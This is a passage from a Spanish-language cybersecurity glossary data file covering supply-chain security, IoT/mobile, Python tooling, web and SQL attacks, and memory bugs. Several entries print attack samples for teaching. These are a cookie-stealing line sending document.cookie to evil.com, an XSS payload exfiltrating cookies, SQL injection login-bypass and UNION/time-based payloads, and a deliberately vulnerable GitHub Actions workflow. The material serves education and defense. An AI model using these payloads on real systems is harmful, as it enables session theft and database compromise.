      "```\nPOST /Users              → crear usuario\nPATCH /Users/{id}        → modificar (grupos, atributos)\nDELETE /Users/{id}       → desactivar (soft-delete)\nGET /Users               → listar/sincronizar\nPOST /Groups             → gestionar grupos\n```\n" +
      "\n**El problema que resuelve — deprovisioning:**\n" +
      "Un empleado se va. IT desactiva Okta. Sin SCIM, ese ex-empleado sigue teniendo cuenta activa en Slack, GitHub, Notion, Datadog… durante semanas. Con SCIM: la desactivación en Okta se propaga a los 40 SaaS en minutos.\n" +
      "\n**Además del ciclo de vida, SCIM gestiona:**\n" +
      "• **Group membership** — grupos del IdP se replican como equipos en cada SaaS.\n" +
      "• **Just-in-time provisioning** — el usuario se crea al primer login (SSO) sin config manual.\n" +
      "• **Atributos** — email, department, manager viajan con el user.\n" +
      "\n> 💡 SCIM + SSO (SAML/OIDC) es la combinación estándar de zero-friction identity en enterprise. SSO autentica; SCIM provisiona.\n" +
      "> ⚠️ SCIM en SaaS free tiers suele estar detrás de *enterprise plans*. La 'SSO tax' es real y desincentiva la seguridad en PYMEs.",
    examples: [
      "Empleado renuncia → HR cierra en Workday → sync a Entra → SCIM propaga a 30 SaaS → cero cuentas huérfanas.",
      "Grupo Okta 'engineering' → SCIM → team 'engineering' en GitHub con permisos preconfigurados.",
      "Auditoría: reporte de 'usuarios en SaaS sin match en IdP' — expone huérfanas de deprovisioning fallado.",
    ],
    related: ["Ciclo de vida de la identidad", "SSO y federación", "Autenticación passwordless", "MFA y autenticación moderna"],
  },
  {
    id: 517,
    module: 48,
    term: "SLSA (Supply-chain Levels for Software Artifacts)",
    short: "Framework de 4 niveles para dar garantías de integridad y procedencia a un artefacto software.",
    detail:
      "**SLSA** (*se lee 'salsa'*) es un framework de Google/OpenSSF que define **niveles de garantía** (L1 → L4) sobre cómo se construye y distribuye un artefacto de software. Nace post-SolarWinds como respuesta a los ataques a la supply chain.\n" +
      "\n**Los 4 niveles:**\n" +
      "| Nivel | Build | Provenance | Aislamiento | Ejemplo |\n" +
      "|---|---|---|---|---|\n" +
      "| **L1** | Automatizado | Existe | — | Makefile en un repo |\n" +
      "| **L2** | Build service hospedado | Firmado | — | GitHub Actions con provenance |\n" +
      "| **L3** | Build platform aislada | No falsificable | Source hermético (locked deps) | Google Cloud Build + SLSA generator |\n" +
      "| **L4** | Two-party review | Reproducible bit-a-bit | Build reproducible | Aspiracional; sistemas de misión crítica |\n" +
      "\n**Provenance = declaración firmada** que dice: *'este artefacto fue construido por builder X, desde source Y (commit Z), con dependencias W, siguiendo build script V'*. Sin provenance no hay auditabilidad.\n" +
      "\n**Cómo se implementa en la práctica (SLSA L3 con GitHub):**\n" +
      "```yaml\n- uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v1.9.0\n  with:\n    base64-subjects: ${{ steps.hash.outputs.hashes }}\n```\n" +
      "El generator corre en un runner GitHub aislado, no accesible por el workflow del proyecto — cierra el vector de un action malicioso falsificando la provenance.\n" +
      "\n**Ecosistemas con SLSA:**\n" +
      "• **npm** — provenance automática desde 2023 en `npm publish --provenance`.\n" +
      "• **PyPI** — provenance con trusted publishers (OIDC) desde 2024.\n" +
      "• **Distroless, Kubernetes, GitHub** — publican con SLSA L3.\n" +
      "> 💡 SLSA es **complementario** a cosign/Sigstore: Sigstore firma, SLSA da el contenido de la firma (qué se construyó, dónde, cómo).\n" +
      "> ⚠️ SLSA no protege contra bugs en el código fuente ni contra un mantenedor malicioso — protege contra la manipulación entre commit y artefacto publicado.",
    examples: [
      "npm package con provenance SLSA L3: `npm view <pkg>` muestra el commit + workflow que lo publicó.",
      "PyPI con Trusted Publishers: solo el workflow oficial del proyecto puede publicar (sin API token robable).",
      "Auditoría de dependencias: rechazar builds que consumen packages sin provenance L2+.",
    ],
    related: ["Supply chain de imágenes (cosign / Sigstore / SLSA)", "Seguridad del pipeline y secretos", "Dependency confusion", "OIDC federation en CI/CD"],
  },
  {
    id: 518,
    module: 48,
    term: "Dependency confusion",
    short: "Publicar un package con el mismo nombre que uno interno en el registry público: el resolver del CI se confunde y usa el malicioso.",
    detail:
      "**Ataque publicado por Alex Birsan (2021)** — comprometió Apple, Microsoft, PayPal, Netflix, Uber, Yelp, Shopify y decenas más con un solo bug conceptual.\n" +
      "\n**Cómo funciona:**\n" +
      "1. Empresa X tiene un paquete interno `@empresa/utils` publicado en su registry privado.\n" +
      "2. Atacante inventa un package con **el mismo nombre** en npm público, versión `99.99.99`.\n" +
      "3. Los package managers (npm, pip, gem) por defecto usan la **versión más alta** de los registries configurados.\n" +
      "4. Un CI mal configurado que consulta ambos registries baja la del atacante.\n" +
      "5. El `postinstall` script del atacante ejecuta arbitrariamente durante `npm install`.\n" +
      "\n**Vectores por ecosistema:**\n" +
      "| Ecosistema | Vector | Contramedida |\n" +
      "|---|---|---|\n" +
      "| npm | Scope público con mismo nombre | `.npmrc` con `@scope:registry=` explícito |\n" +
      "| pip | Nombre igual en PyPI vs pypi corp | `--index-url` (no `--extra-index-url`) |\n" +
      "| RubyGems | Similar a npm | `Gemfile` con sources bloqueadas |\n" +
      "| NuGet | package sources ordered | Package source mapping |\n" +
      "| Go modules | GOPROXY chain | `GONOSUMCHECK` + private module proxy |\n" +
      "\n**Fix duradero:**\n" +
      "• **Namespacing** — usar scopes (`@empresa/utils`) reservados en npm público.\n" +
      "• **Namespace claims** — pip Trusted Publishers, npm scope registration.\n" +
      "• **Registry único** — el CI solo puede resolver desde tu proxy, que mirrorea npm sin permitir override de packages internos.\n" +
      "• **Provenance verification** — solo aceptar packages con SLSA de builders conocidos.\n" +
      "\n> 💡 Birsan cobró $130K+ en bug bounties del ataque original en 2021. Se ha extendido a **typosquatting** (`reqeusts` en vez de `requests`) y **starjacking** (fake stars para dar confianza).\n" +
      "> ⚠️ El bug de config del CI está en muchas orgs: revisar HOY con `npm config get registry` en cada workflow.",
    examples: [
      "Auditoría: buscar nombres de packages internos en npm/PyPI públicos → si existen, son sospechosos.",
      "npmrc corp: `@miorg:registry=https://npm.miorg.com` + `registry=https://npm.miorg.com/proxy`.",
      "Detección: alert si el CI baja un package con >100 versiones publicadas el mismo día.",
    ],
    related: ["Dependency scanning (SCA)", "SLSA (Supply-chain Levels for Software Artifacts)", "Supply chain de imágenes (cosign / Sigstore / SLSA)", "Vulnerable and Outdated Components"],
  },
  {
    id: 519,
    module: 48,
    term: "pull_request_target abuse en GitHub Actions",
    short: "El trigger que corre con secrets sobre código de un fork: usado mal, escalada trivial a admin del repo.",
    detail:
      "GitHub Actions tiene dos triggers para PRs:\n" +
      "\n| Trigger | Contexto | Secrets |\n" +
      "|---|---|---|\n" +
      "| **`pull_request`** | Código del fork | **NO** disponibles (safe) |\n" +
      "| **`pull_request_target`** | Código del **base branch** | **SÍ** disponibles |\n" +
      "\nEl segundo se creó para casos legítimos: comentar el PR, aplicar labels, verificar CLA. Pero es el **vector clásico** cuando un maintainer distraído hace:\n" +
      "\n```yaml\non: pull_request_target\njobs:\n  ci:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}  # <-- BUG\n      - run: npm test                                    # <-- corre código del fork con secrets\n```\n" +
      "\nEl bug: `ref` apunta al SHA del fork (código untrusted), pero el workflow está en modo `pull_request_target` (secrets disponibles). Un atacante abre un PR que modifica `npm test` para exfiltrar `GITHUB_TOKEN` y publicar como el repo.\n" +
      "\n**Casos reales:**\n" +
      "• 2022: repo de Google Cloud Platform tuvo esta vulnerability, reportada por seguridad interna.\n" +
      "• 2023: múltiples proyectos OSS grandes (más de 50 documentados por Trail of Bits).\n" +
      "• Ha permitido publicar packages npm/PyPI maliciosos con la credencial del maintainer.\n" +
      "\n**Contramedidas:**\n" +
      "• **NUNCA `checkout` el head del PR en `pull_request_target`** — dejarlo con el default (base branch).\n" +
      "• Si necesitas ver el fork code, hacerlo en un workflow separado con `pull_request` (sin secrets).\n" +
      "• Restringir el token con `permissions:` mínimas (default es cambiar a read-only en 2023).\n" +
      "• Usar `environments` con approval para jobs que necesitan escribir.\n" +
      "\n> 💡 GitHub agregó una gran advertencia en 2023: si un workflow con `pull_request_target` hace checkout del PR, aparece un warning UI.\n" +
      "> ⚠️ Herramientas: **actionlint** detecta patterns peligrosos; **GitHub CodeQL** tiene queries para esto; **Trail of Bits' Semgrep rules** cubren el catálogo completo.",
    examples: [
      "Audit GitHub org: `gh api repos/miorg/*/actions/workflows` → grep `pull_request_target` → verificar cada uno.",
      "Ejemplo bueno: workflow con `pull_request_target` que solo etiqueta el PR según regex, sin checkout.",
      "Migración segura: mover CI a `pull_request` (fork code sin secrets) + comentarios via workflow separado.",
    ],
    related: ["Seguridad del pipeline y secretos", "OIDC federation en CI/CD", "Dependency confusion", "SAST y DAST"],
  },

  // ── M49 · IoT y Mobile Security ──────────────────────────────────────────
  {
    id: 520,
    module: 49,
    term: "OWASP IoT Top 10",
    short: "Los 10 riesgos más comunes en dispositivos del Internet de las Cosas.",
    detail:
      "El **OWASP IoT Top 10** lista las debilidades típicas del IoT, encabezadas por las **contraseñas débiles/por defecto**, **servicios de red inseguros** y la **falta de actualización segura**. El IoT combina lo peor de varios mundos: hardware barato, software sin parchear y exposición a Internet.\n" +
      "> 💡 Ver el diagrama 'OWASP IoT Top 10' más abajo con los 10 riesgos y su mitigación.",
    examples: [
      "Una cámara IP con usuario/clave 'admin/admin' expuesta a Internet.",
      "Un dispositivo sin mecanismo de actualización de firmware.",
    ],
    related: ["Análisis de firmware", "Seguridad Android (APK)", "BLE y hardware hacking"],
  },
  {
    id: 521,
    module: 49,
    term: "Análisis de firmware",
    short: "Extraer y examinar el software embebido de un dispositivo para hallar fallos y secretos.",
    detail:
      "El **firmware** es el software que corre en el dispositivo. Analizarlo revela **credenciales hardcodeadas**, claves, binarios vulnerables y backdoors. Se **extrae** (de la web del fabricante o leyendo la flash) y se **desempaqueta** con herramientas como **binwalk**.\n" +
      "binwalk -e firmware.bin\n" +
      "> ⚠️ Es habitual encontrar claves privadas o contraseñas en claro dentro del sistema de archivos del firmware.",
    examples: [
      "binwalk extrayendo el sistema de archivos de un router.",
      "Hallar una clave SSH embebida en el firmware.",
    ],
    related: ["OWASP IoT Top 10", "BLE y hardware hacking", "Análisis estático"],
  },
  {
    id: 522,
    module: 49,
    term: "Seguridad Android (APK)",
    short: "Las apps Android se empaquetan en APK, decompilables para análisis de seguridad.",
    detail:
      "Una app **Android** es un **APK** (un ZIP con código DEX, recursos y el manifest). Se **decompila** (jadx, apktool) para revisar permisos excesivos, **secretos embebidos**, endpoints y lógica insegura. El **OWASP Mobile Top 10** guía qué buscar (almacenamiento inseguro, criptografía débil).\n" +
      "jadx -d salida/ app.apk\n" +
      "> ⚠️ Las API keys hardcodeadas en el APK son triviales de extraer: el cliente nunca es de confianza.",
    examples: [
      "Decompilar un APK con jadx y encontrar una clave de API.",
      "Revisar AndroidManifest.xml por permisos y componentes exportados.",
    ],
    related: ["Seguridad iOS", "OWASP IoT Top 10", "Análisis estático"],
  },
  {
    id: 523,
    module: 49,
    term: "Seguridad iOS",
    short: "El modelo cerrado de iOS: sandbox fuerte, pero con sus propios vectores.",
    detail:
      "**iOS** tiene un modelo más cerrado: apps en **sandbox**, firma obligatoria y App Store revisada. El análisis es más difícil (suele requerir **jailbreak** o un dispositivo de pruebas). Riesgos comunes: **almacenamiento inseguro** en el Keychain mal usado, criptografía débil y fugas por logs o backups.",
    examples: [
      "Revisar el uso del Keychain para datos sensibles.",
      "Analizar el tráfico de la app con un proxy y certificado propio.",
    ],
    related: ["Seguridad Android (APK)", "OWASP IoT Top 10", "Certificate transparency y pinning"],
  },
  {
    id: 524,
    module: 49,
    term: "BLE y hardware hacking",
    short: "Atacar el dispositivo por sus interfaces físicas e inalámbricas de corto alcance.",
    detail:
      "Más allá del software, el dispositivo se ataca por su **hardware**:\n" +
      "• **BLE** (Bluetooth Low Energy) — sniffing y replay de la comunicación inalámbrica.\n" +
      "• **Interfaces de depuración** — **UART**, **JTAG/SWD** dan acceso de consola o a la memoria.\n" +
      "• **Dump de flash** — leer el chip de memoria directamente para extraer el firmware.\n" +
      "> 💡 Un pin de UART en la placa suele dar una shell de root sin autenticación.",
    examples: [
      "Conectarse por UART para obtener una consola del dispositivo.",
      "Sniffar BLE para capturar comandos entre app y dispositivo.",
    ],
    related: ["Análisis de firmware", "OWASP IoT Top 10", "Estándares de seguridad WiFi"],
  },

  // ── M50 · Proyecto Final y Carrera ───────────────────────────────────────
  {
    id: 530,
    module: 50,
    term: "Auditoría end-to-end",
    short: "Aplicar todo lo aprendido en un ejercicio completo, del recon al reporte.",
    detail:
      "El proyecto final integra el ciclo completo: **reconocimiento → escaneo → enumeración → explotación → post-explotación → reporte**, sobre un objetivo autorizado (un laboratorio o CTF). Demuestra no solo saber usar herramientas, sino **encadenar** hallazgos y **comunicar** el impacto.\n" +
      "> 💡 Practica en entornos legales: HackTheBox, TryHackMe, VulnHub o laboratorios propios.",
    examples: [
      "Comprometer una máquina de HackTheBox y documentar el proceso.",
      "Una auditoría de caja negra de principio a fin en un lab.",
    ],
    related: ["Reporte profesional", "Portfolio y carrera"],
  },
  {
    id: 531,
    module: 50,
    term: "Reporte profesional",
    short: "El entregable real de un pentest: comunica riesgo y remediación, no solo técnica.",
    detail:
      "El **reporte** es el producto que paga el cliente. Estructura típica: **resumen ejecutivo** (para dirección, sin jerga), **alcance y metodología**, **hallazgos** con severidad (**CVSS**) y **evidencia (PoC)**, y **recomendaciones** priorizadas.\n" +
      "> 💡 Un hallazgo crítico mal comunicado no se arregla: saber **escribir** vale tanto como saber explotar. Ver el diagrama de estructura del reporte.",
    examples: [
      "Un resumen ejecutivo que un CEO entiende en 2 minutos.",
      "Cada hallazgo con impacto, evidencia y pasos de remediación.",
    ],
    related: ["Auditoría end-to-end", "CVE y CVSS", "Plan de certificaciones"],
  },
  {
    id: 532,
    module: 50,
    term: "Plan de certificaciones",
    short: "Una ruta de certificaciones acorde a la especialización elegida.",
    detail:
      "Las certificaciones **estructuran el aprendizaje** y abren puertas. La ruta depende de la **rama**: ofensiva (eJPT → PNPT/OSCP), defensiva (Security+ → BTL1 → GCIH), cloud, GRC, etc. Conviene empezar por **fundamentos** (Security+) y subir según el objetivo.\n" +
      "> 💡 Ver la sección de certificaciones de la academia: catálogo por track y nivel.",
    examples: [
      "Empezar con eJPT y apuntar a OSCP para pentesting.",
      "Security+ como base transversal antes de especializarse.",
    ],
    related: ["Portfolio y carrera", "Reporte profesional"],
  },
  {
    id: 533,
    module: 50,
    term: "Portfolio y carrera",
    short: "Demostrar habilidades con evidencia pública es tan valioso como los títulos.",
    detail:
      "Un **portfolio** prueba lo que sabes hacer: **writeups** de CTFs y máquinas, contribuciones open source, un blog técnico, perfil de **TryHackMe/HackTheBox**, **bug bounties**. Combinado con networking (conferencias, comunidades), suele pesar tanto como el CV formal.\n" +
      "> 💡 'Show, don't tell': un buen writeup vale más que una línea en el currículum.",
    examples: [
      "Un repositorio con writeups de máquinas resueltas.",
      "Reportes válidos en programas de bug bounty.",
    ],
    related: ["Plan de certificaciones", "CTF y práctica deliberada", "Auditoría end-to-end"],
  },
  {
    id: 534,
    module: 50,
    term: "CTF y práctica deliberada",
    short: "Los Capture The Flag entrenan habilidades reales de forma legal y gamificada.",
    detail:
      "Los **CTF** (*Capture The Flag*) son retos de seguridad legales y gamificados: **Jeopardy** (categorías: web, cripto, forense, pwn, reversing) o **Attack-Defense**. Son la mejor forma de **practicar deliberadamente** y mantenerse afilado; diseñar uno propio demuestra dominio.",
    examples: [
      "Resolver retos de pwn y web en un CTF de fin de semana.",
      "Diseñar un CTF para enseñar a otros (nivel avanzado).",
    ],
    related: ["Portfolio y carrera", "Auditoría end-to-end", "Reporte profesional"],
  },

  // ── M51 · Python para Ciberseguridad ─────────────────────────────────────
  {
    id: 540,
    module: 51,
    term: "Python en seguridad",
    short: "El lenguaje de facto del hacking: simple, con un ecosistema enorme y prototipado rápido.",
    detail:
      "**Python** domina la ciberseguridad por su **sintaxis legible**, su **enorme ecosistema** de librerías y la rapidez para **prototipar herramientas**. Se usa en pentesting, análisis de malware, forense, automatización y exploit development.\n" +
      "> 💡 La mayoría de las herramientas ofensivas modernas (o sus PoCs) están escritas en Python.",
    examples: [
      "Un escáner de puertos en 10 líneas con sockets.",
      "Automatizar el parseo de la salida de nmap.",
    ],
    related: ["Sockets y networking", "Scapy y requests", "Automatización de pentesting"],
  },
  {
    id: 541,
    module: 51,
    term: "Sockets y networking",
    short: "La librería socket permite hablar TCP/UDP directamente: la base de las herramientas de red.",
    detail:
      "El módulo **`socket`** da control de bajo nivel sobre conexiones TCP/UDP, base de escáneres y clientes/servidores. `connect_ex` devuelve 0 si el puerto está abierto.\n" +
      "import socket\n" +
      "def open(ip, port):\n" +
      "    s = socket.socket(); s.settimeout(1)\n" +
      "    r = s.connect_ex((ip, port)); s.close()\n" +
      "    return r == 0",
    examples: [
      "Un port scanner que recorre range(1, 1025).",
      "Un cliente que envía un banner-grab a un servicio.",
    ],
    related: ["Python en seguridad", "Scapy y requests", "Tipos de escaneo Nmap"],
  },
  {
    id: 542,
    module: 51,
    term: "Scapy y requests",
    short: "Dos librerías estrella: crafting de paquetes (Scapy) y HTTP de alto nivel (requests).",
    detail:
      "• **Scapy** — crea, envía y diseca **paquetes** a voluntad (escaneos custom, spoofing, sniffing).\n" +
      "• **requests** — cliente **HTTP** sencillo para interactuar con webs/APIs (fuzzing, scraping, auth).\n" +
      "from scapy.all import IP, TCP, sr1\n" +
      "ans = sr1(IP(dst='10.0.0.5')/TCP(dport=80, flags='S'), timeout=1)",
    examples: [
      "Un SYN scan con Scapy sin depender de nmap.",
      "requests.get(url) para inspeccionar headers de respuesta.",
    ],
    related: ["Sockets y networking", "Librerías clave de seguridad", "Análisis de PCAP"],
  },
  {
    id: 543,
    module: 51,
    term: "Librerías clave de seguridad",
    short: "El ecosistema que convierte a Python en una navaja suiza ofensiva y defensiva.",
    detail:
      "| Librería | Uso |\n" +
      "|---|---|\n" +
      "| impacket | Protocolos Windows (SMB, NTLM, Kerberos) |\n" +
      "| paramiko | Cliente SSH |\n" +
      "| pwntools | Exploit development (CTF/pwn) |\n" +
      "| pycryptodome | Cifrado |\n" +
      "| yara-python | Detección de malware |\n" +
      "| volatility3 | Forense de memoria |\n" +
      "> 💡 `impacket` y `pwntools` son omnipresentes en pentesting de AD y en exploiting.",
    examples: [
      "impacket para un psexec.py con un hash robado.",
      "pwntools para automatizar la explotación de un binario.",
    ],
    related: ["Scapy y requests", "Automatización de pentesting", "Movimiento lateral"],
  },
  {
    id: 544,
    module: 51,
    term: "Automatización de pentesting",
    short: "Encadenar escaneo, parseo y explotación en scripts repetibles.",
    detail:
      "El valor de Python en pentest es **automatizar lo tedioso**: lanzar herramientas, **parsear** su salida, correlacionar y disparar el siguiente paso. Convierte un flujo manual de horas en un comando reproducible.\n" +
      "> 💡 Automatizar también reduce errores y hace el trabajo auditable y repetible.",
    examples: [
      "Un script que corre nmap, extrae puertos abiertos y lanza enumeración.",
      "Orquestar una cadena recon → escaneo → reporte.",
    ],
    related: ["Python en seguridad", "Librerías clave de seguridad"],
  },

  // ── M52 · Python Avanzado para Seguridad ─────────────────────────────────
  {
    id: 550,
    module: 52,
    term: "Regex y parsing de logs",
    short: "Las expresiones regulares extraen información estructurada de texto desordenado.",
    detail:
      "Gran parte del trabajo de seguridad es **procesar logs**. Las **expresiones regulares** (`re`) extraen IPs, fechas, errores y patrones de millones de líneas.\n" +
      "import re\n" +
      "ips = re.findall(r'\\d+\\.\\d+\\.\\d+\\.\\d+', open('auth.log').read())\n" +
      "> 💡 Combinado con `collections.Counter`, en pocas líneas se obtiene el top de IPs atacantes.",
    examples: [
      "Extraer todas las IPs de logins fallidos de un log.",
      "Parsear timestamps para construir una timeline.",
    ],
    related: ["El trío grep / awk / sed", "APIs de threat intel", "Tool building en Python"],
  },
  {
    id: 551,
    module: 52,
    term: "cryptography en Python",
    short: "Implementar y romper cifrado con librerías como cryptography y pycryptodome.",
    detail:
      "Las librerías **`cryptography`** y **`pycryptodome`** dan primitivas listas (AES, RSA, hashing, HMAC) para herramientas defensivas y para retos de cripto en CTF. Evitan el antipatrón de 'rodar tu propia cripto'.\n" +
      "> ⚠️ Usar las primitivas de alto nivel (Fernet) en vez de ensamblar AES a mano reduce errores fatales (IV reuse, padding).",
    examples: [
      "Cifrar un archivo de configuración con Fernet.",
      "Resolver un reto de cripto descifrando con una clave hallada.",
    ],
    related: ["Cifrado simétrico", "Tool building en Python", "Regex y parsing de logs"],
  },
  {
    id: 552,
    module: 52,
    term: "APIs de threat intel",
    short: "Automatizar consultas a servicios como VirusTotal y Shodan enriquece el análisis.",
    detail:
      "Python consume **APIs** de inteligencia para enriquecer indicadores: **VirusTotal** (reputación de hashes/URLs), **Shodan** (hosts expuestos), AbuseIPDB. Permite enriquecer una alerta o un IoC de forma masiva y automática.\n" +
      "import requests\n" +
      "r = requests.get(f'https://www.virustotal.com/api/v3/files/{h}', headers={'x-apikey': KEY})",
    examples: [
      "Consultar VirusTotal por el hash de una muestra.",
      "Buscar en Shodan los servidores de una organización.",
    ],
    related: ["Threat intelligence", "Shodan y Censys", "Tool building en Python"],
  },
  {
    id: 553,
    module: 52,
    term: "Tool building en Python",
    short: "Convertir un script en una herramienta usable: argumentos, estructura y manejo de errores.",
    detail:
      "Una herramienta seria va más allá del script: **`argparse`** para argumentos CLI, estructura en funciones/módulos, manejo de errores y salida clara. Así la usan otros y se integra en pipelines.\n" +
      "import argparse\n" +
      "p = argparse.ArgumentParser(); p.add_argument('-t', '--target')",
    examples: [
      "Una CLI con --target y --ports y ayuda automática.",
      "Empaquetar la herramienta para distribuirla (pip).",
    ],
    related: ["Regex y parsing de logs", "APIs de threat intel", "Automatización de pentesting"],
  },

  // ── M53 · JavaScript y Seguridad Web ─────────────────────────────────────
  {
    id: 560,
    module: 53,
    term: "Fundamentos de JavaScript",
    short: "El lenguaje del navegador: entenderlo es clave para atacar y defender la web.",
    detail:
      "**JavaScript** corre en el navegador de cada usuario, por lo que es el medio de los ataques **del lado del cliente** (XSS, clickjacking). Entender su sintaxis, el event loop y el DOM es imprescindible tanto para el atacante como para auditar código frontend.",
    examples: [
      "Leer y entender el JS de una SPA para hallar endpoints ocultos.",
      "Auditar una función de sanitización del lado del cliente.",
    ],
    related: ["DOM manipulation", "XSS desde el atacante", "Node.js security"],
  },
  {
    id: 561,
    module: 53,
    term: "DOM manipulation",
    short: "El JS puede leer y modificar la página viva — incluidas las cookies y el contenido.",
    detail:
      "El **DOM** es la representación viva de la página. JavaScript puede **leerlo y modificarlo**: cambiar contenido, leer `document.cookie`, redirigir. Es justo lo que abusa un XSS para robar sesión o alterar la página.\n" +
      "document.location = 'http://evil.com?c=' + document.cookie\n" +
      "> ⚠️ Por eso las cookies de sesión deben ser **HttpOnly**: inaccesibles desde el DOM.",
    examples: [
      "Un payload que exfiltra document.cookie a un servidor del atacante.",
      "Modificar el DOM para insertar un formulario de login falso.",
    ],
    related: ["Fundamentos de JavaScript", "XSS desde el atacante", "Cookie security"],
  },
  {
    id: 562,
    module: 53,
    term: "XSS desde el atacante",
    short: "Ver el XSS desde la ofensiva: qué se puede lograr inyectando JavaScript.",
    detail:
      "Desde la perspectiva ofensiva, un **XSS** ejecuta JS en el contexto de la víctima: **robo de sesión**, keylogging, acciones en su nombre, o un BeEF hook para controlar el navegador. La gravedad depende de qué pueda hacer ese usuario.\n" +
      "<img src=x onerror=\"fetch('//evil/'+document.cookie)\">",
    examples: [
      "Stored XSS en un comentario que roba la sesión de quien lo lee.",
      "Encadenar XSS + CSRF para acciones privilegiadas.",
    ],
    related: ["Cross-Site Scripting (XSS)", "DOM manipulation", "Prevención de inyección"],
  },
  {
    id: 563,
    module: 53,
    term: "Node.js security",
    short: "JS también corre en el servidor: nuevos riesgos (inyección de comandos, deps).",
    detail:
      "Con **Node.js**, JavaScript corre en el **servidor**, con sus propios riesgos: **inyección de comandos** (`child_process`), **prototype pollution**, deserialización insegura y un árbol de **dependencias npm** enorme (supply chain). El `npm audit` y evitar `eval`/`exec` con entrada de usuario son básicos.\n" +
      "> ⚠️ Pasar entrada de usuario a `child_process.exec` es RCE directo.",
    examples: [
      "Una API Node vulnerable a inyección de comandos por exec.",
      "Una dependencia npm comprometida (supply chain).",
    ],
    related: ["Fundamentos de JavaScript", "Dependency scanning (SCA)", "Injection"],
  },

  // ── M54 · SQL y Seguridad de Bases de Datos ──────────────────────────────
  {
    id: 570,
    module: 54,
    term: "Fundamentos de SQL",
    short: "El lenguaje de las bases de datos relacionales: saberlo es requisito para atacarlas y protegerlas.",
    detail:
      "**SQL** consulta y manipula bases de datos relacionales (`SELECT`, `INSERT`, `WHERE`, `UNION`, `JOIN`). Entender cómo se construye una consulta es lo que permite ver **dónde** la entrada del usuario puede romperla (inyección).\n" +
      "SELECT * FROM users WHERE user = 'alice' AND pass = '...';",
    examples: [
      "Una consulta de login que concatena usuario y contraseña.",
      "Un UNION SELECT para combinar resultados de otra tabla.",
    ],
    related: ["SQL Injection manual", "Blind y time-based SQLi", "Database hardening"],
  },
  {
    id: 571,
    module: 54,
    term: "SQL Injection manual",
    short: "Inyectar SQL a mano para entender qué hace cada payload, no solo lanzar sqlmap.",
    detail:
      "Explotar **a mano** enseña la mecánica: romper la consulta con una comilla, comentar el resto, y usar **UNION** para extraer datos.\n" +
      "' OR 1=1 -- \n" +
      "' UNION SELECT username, password FROM users -- \n" +
      "> 💡 Dominar el SQLi manual permite hacer **WAF bypass** donde las herramientas automáticas fallan.",
    examples: [
      "Saltarse un login con ' OR 1=1 --.",
      "Extraer columnas con ORDER BY y luego UNION SELECT.",
    ],
    related: ["SQL Injection", "Blind y time-based SQLi", "Fundamentos de SQL"],
  },
  {
    id: 572,
    module: 54,
    term: "Blind y time-based SQLi",
    short: "Cuando no se ven los datos, se infieren por respuestas booleanas o por tiempo.",
    detail:
      "Si la app no muestra el resultado, el SQLi es **a ciegas**:\n" +
      "• **Booleano** — la página cambia según si la condición es verdadera o falsa.\n" +
      "• **Time-based** — se fuerza un retardo y se mide el tiempo de respuesta.\n" +
      "' AND IF(SUBSTRING(@@version,1,1)='8', SLEEP(5), 0) -- \n" +
      "> 💡 Es lento (bit a bit), por eso se automatiza, pero entender la lógica es clave.",
    examples: [
      "Inferir la versión de la BD carácter a carácter por tiempo.",
      "Un blind booleano que revela datos por diferencias en la página.",
    ],
    related: ["SQL Injection manual", "SQL Injection", "Herramientas: sqlmap"],
  },
  {
    id: 573,
    module: 54,
    term: "Database hardening",
    short: "Endurecer la base de datos para limitar el daño aunque haya inyección.",
    detail:
      "Defensa en capas para bases de datos:\n" +
      "• **Consultas parametrizadas** — la cura raíz del SQLi.\n" +
      "• **Mínimo privilegio** — la cuenta de la app no debe ser admin de la BD.\n" +
      "• **Cifrado** en reposo y en tránsito; **segmentar** la BD en red privada.\n" +
      "• **Auditoría** de accesos y consultas anómalas.\n" +
      "> 💡 Con mínimo privilegio, un SQLi exitoso causa mucho menos daño.",
    examples: [
      "La app conecta con un usuario que solo puede SELECT/INSERT lo necesario.",
      "Base de datos en subred privada, sin exposición a Internet.",
    ],
    related: ["Prevención de inyección", "Principio de mínimo privilegio", "DMZ y segmentación de red"],
  },

  // ── M55 · C/C++ y Low-Level Security ─────────────────────────────────────
  {
    id: 580,
    module: 55,
    term: "Fundamentos de C",
    short: "El lenguaje de los sistemas: potente, cercano al hardware y sin red de seguridad.",
    detail:
      "**C** es la base de SOs, drivers y software de bajo nivel. Da control directo de la memoria mediante **punteros**, pero **no protege** contra accesos inválidos: ahí nacen las vulnerabilidades de memoria (overflows, use-after-free) que dominan el exploiting.\n" +
      "> 💡 Leer C es imprescindible para auditar software de sistemas y entender exploits.",
    examples: [
      "Un puntero que accede fuera de los límites de un array.",
      "Auditar código C en busca de funciones inseguras (strcpy, gets).",
    ],
    related: ["Gestión de memoria", "Buffer overflow", "Shellcode básico"],
  },
  {
    id: 581,
    module: 55,
    term: "Gestión de memoria",
    short: "Stack y heap: dónde viven los datos y por qué importa para la seguridad.",
    detail:
      "La memoria de un proceso se divide en regiones; las dos clave para el exploiting:\n" +
      "| Región | Contiene |\n" +
      "|---|---|\n" +
      "| Stack | Variables locales, dirección de retorno |\n" +
      "| Heap | Memoria dinámica (malloc/free) |\n" +
      "En C **tú gestionas** la memoria: errores como liberar dos veces (double free), usar tras liberar (**use-after-free**) o escribir de más (**overflow**) son explotables.\n" +
      "> ⚠️ La dirección de retorno guardada en el stack es el objetivo clásico de un buffer overflow.",
    examples: [
      "Un use-after-free al usar un puntero ya liberado.",
      "Una variable local desbordada que pisa la dirección de retorno.",
    ],
    related: ["Fundamentos de C", "Buffer overflow", "Shellcode básico"],
  },
  {
    id: 582,
    module: 55,
    term: "Buffer overflow",
    short: "Escribir más datos de los que cabe en un buffer corrompe la memoria adyacente.",
    detail:
      "Un **buffer overflow** ocurre cuando se escriben **más bytes de los que el buffer admite**, sobrescribiendo memoria contigua. En el stack, eso puede pisar la **dirección de retorno** y **redirigir la ejecución** al código del atacante.\n" +
      "char buf[64]; strcpy(buf, input); // si input > 64 → overflow\n" +
      "> 💡 Mitigaciones modernas: **stack canary**, **ASLR**, **DEP/NX**. Ver el diagrama 'Anatomía de un buffer overflow'.",
    examples: [
      "strcpy de una entrada larga que sobrescribe el saved EIP.",
      "Un gets() clásico explotable en un binario de CTF.",
    ],
    related: ["Gestión de memoria", "Shellcode básico", "Exploit y Payload"],
  },
  {
    id: 583,
    module: 55,
    term: "Shellcode básico",
    short: "El código máquina que se ejecuta tras tomar control del flujo de un programa.",
    detail:
